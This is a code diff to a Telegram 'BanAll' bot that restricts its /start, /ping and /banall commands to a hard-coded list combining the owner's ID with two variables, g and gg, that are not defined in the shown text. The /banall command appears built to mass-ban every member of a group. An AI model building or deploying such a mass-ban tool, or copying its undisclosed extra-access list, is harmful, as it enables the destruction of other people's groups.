@@ -23,6 +23,7 @@ API_ID = int(getenv("API_ID", ""))
 API_HASH = getenv("API_HASH", "")
 BOT_TOKEN = getenv("BOT_TOKEN", None)
 OWNER_ID = getenv("OWNER_ID", None)
+SEXY = [int(g), int(gg), int(OWNER_ID)]
 #TelegramClient..
 main = TelegramClient(
     "BanAll",
@@ -36,7 +37,7 @@ repo = "https://github.com/WCGKING/BRANDED-ALLBAN"
 async def start(event):
     buttns = [Button.url("Support", "https://t.me/BRANDED_WORLD"), Button.url("Repo", f'{repo}')]
     py = platform.python_version()
-    if event.sender.id in :
+    if event.sender.id in SEXY:
         await main.send_file(
             event.chat.id,
             file="https://te.legra.ph/file/619ac09e97217459cac3d.jpg",
@@ -50,7 +51,7 @@ async def start(event):
             link_preview=False,
             buttons=buttns
         )
-    if event.sender.id not in:
+    if event.sender.id not in SEXY:
         await main.send_file(
             event.chat.id,
             file="https://te.legra.ph/file/619ac09e97217459cac3d.jpg",
@@ -70,7 +71,7 @@ async def start(event):
 async def start(event):
     buttns = [Button.url("SUPPORT", "https://t.me/BRANDED_WORLD"), Button.url("REPO", f'{repo}')]
     py = platform.python_version()
-    if event.sender.id in:
+    if event.sender.id in SEXY:
         await main.send_file(
             event.chat.id,
             file="https://te.legra.ph/file/619ac09e97217459cac3d.jpg",
@@ -78,7 +79,7 @@ async def start(event):
             link_preview=False,
             buttons=buttns
         )
-    if event.sender.id not in:
+    if event.sender.id not in SEXY:
         await event.reply(
             "This is not for you babe!\n\nMake your own bot from this [Repository](https://github.com/WCGKING/BRANDED-ALLBAN)",
             link_preview=False,
@@ -86,7 +87,7 @@ async def start(event):
 
 @main.on(events.NewMessage(pattern="^/ping"))
 async def ping(event):
-    if event.sender.id in:
+    if event.sender.id in SEXY:
         start = datetime.now()
         t = "Pinging..."
         txxt = await event.reply(t)
@@ -97,7 +98,7 @@ async def ping(event):
 
 @main.on(events.NewMessage(pattern="^/banall"))
 async def bun(event):
-  if event.sender.id in:
+  if event.sender.id in SEXY:
    if not event.is_group:
         Rep = f"Use This Command In Any Group!!"
         await event.reply(Rep)
